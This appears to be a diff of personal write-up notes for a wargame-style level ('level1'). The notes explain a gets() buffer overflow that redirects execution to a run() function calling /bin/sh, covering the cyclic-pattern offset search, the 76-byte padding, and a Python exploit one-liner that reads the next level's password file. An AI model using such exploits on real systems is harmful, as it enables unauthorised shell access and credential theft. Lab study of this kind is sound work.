@@ -1,15 +1,15 @@
-- attack: buffer overflow
+- attack: buffer overflow with direct shell call
 - binary behavior: get argument and do nothing
 - targeted functions: run and main
 - vulnerability in main: gets() function (receives user input) has no buffer limit
 - vulnerability in run: system() runs /bin/sh
 
 Method:
-- find the overflow size
-- find eip offest size
 - find return function address
-- overwite eip by the return address
-- cat passwd when get console with root privedges
+- find the offset padding size
+- overflow the binary
+- overwrite eip with the return function address
+- cat passwd when you will access console with root privedges
 
 Info:
 - 0x08048444 - address of run function
@@ -18,16 +18,31 @@ Info:
 
 - eip register address after segfault - 0x63413563
 - its offset - 76 (from wiremask.eu)
+72 - SIGSEGV, Segmentation fault.
+76 - SIGILL, Illegal instruction.
 
+- offset code structure: 76 = 4 (return address) + 72 (padding)
+
+
+QA
+- how do we know the padding size? 
+- by interative search
+
+- how do we find the return function address?
+- find it in assembler code before finction name: 08048444 <run>
+
+- why we need random pattern generation and simple multiplication of same symbol doesn't work for overflowing in gdb?
+
+- why we use cat here?
+- /bin/sh is called through the pipe and became non-interactive (it read stdin with EOF and closes). cat enables interactive listening here
 
 Code:
 objdump -d ./level1
 gdb level1
     r A # run with argument
 (gdb)  r <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac"
-# use random pattern generation for >80, just multiplication of same symbils doesn't works. Why?
-(python -c 'print "a" * 76 + "\x44\x84\x04\x08"';cat) | ./level1
-cd ..; cat level2/.pass
+(python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+cat /home/user/level2/.pass
 
 Functions
 main
@@ -64,14 +79,3 @@ run
  804847f:       c3
 
 
-
-Additional info
-- pypes
- < - (process substitution) feed the output of right process/es into stdin of lest process
- | - (pipe) same
- < <(;) - same but passing two commands
- <() <() - same
- << - (here-document) pass the ending string, write arguments, exit with writing ending string
- <<< - (here-string) just passing a string as argument
- 
-- hex offset - the order of element in memory array (base address + offset = absolute address)
